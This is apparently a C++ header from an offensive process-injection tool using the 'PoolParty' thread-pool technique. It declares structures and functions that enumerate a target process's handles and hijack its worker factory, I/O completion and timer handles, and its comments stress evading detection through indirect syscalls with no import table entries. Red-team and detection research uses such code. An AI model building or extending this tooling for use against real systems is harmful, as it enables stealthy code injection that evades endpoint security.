#pragma once

// ============================================================================
// Handle Hijacking  Thread Pool Object Discovery
// ============================================================================
// Enumerates all handles in the target process, duplicates them into our
// process, and identifies worker factory, I/O completion port, and timer
// handles by querying their object type and properties.
//
// All NT calls go through indirect syscalls via Tartarus + SyscallManager.
// No GetProcAddress, no IAT entries for any NT API.
// ============================================================================

#include "poolparty_types.h"
#include "memory_writer.h"

namespace HandleHijack {

    // Max IoCompletion handles to track during enumeration
    static const int MAX_IO_COMPLETIONS = 32;

    // Discovered handles from the target process
    struct HijackedHandles {
        HANDLE WorkerFactory;       // Worker factory handle (duplicated into our process)
        HANDLE IoCompletion;        // I/O completion port handle (the CORRECT one for the thread pool)
        HANDLE Timer;               // IRTimer handle (for Variant 8)
        PVOID  TpPoolAddress;       // TP_POOL address in target process (from worker factory query)
        PVOID  StartRoutine;        // TppWorkerThread address in target (for Variant 1)
        ULONG  TotalWorkerCount;    // Current worker thread count (for Variant 1)
        ULONG  MinimumWorkerCount;  // Current minimum (for Variant 1)
        ULONG_PTR WfCompletionPortHandle; // Worker factory's CompletionPort handle value in target
        ULONG_PTR IoCompletionHandleValue; // The handle value we actually grabbed for IoCompletion

        // All IoCompletion candidates found during enumeration
        struct IoCompletionCandidate {
            HANDLE    Duplicated;       // Duplicated handle in our process
            ULONG_PTR HandleValue;      // Original handle value in target process
        };
        IoCompletionCandidate IoCompletionCandidates[MAX_IO_COMPLETIONS];
        int IoCompletionCandidateCount;
    };

    struct HijackResult {
        bool            Success;
        HijackedHandles Handles;
        int             HandleCount;        // Total handles enumerated
        int             WorkerFactories;    // Worker factory handles found
        int             IoCompletions;      // I/O completion handles found
        int             Timers;             // Timer handles found
    };

    // Discover and hijack thread pool handles from the target process.
    // targetProcess must have PROCESS_DUP_HANDLE access.
    // Uses indirect syscalls for all NT operations.
    HijackResult Hijack(HANDLE targetProcess, DWORD targetPid);

    // Release all hijacked handles.
    void Release(HijackedHandles& handles);

} // namespace HandleHijack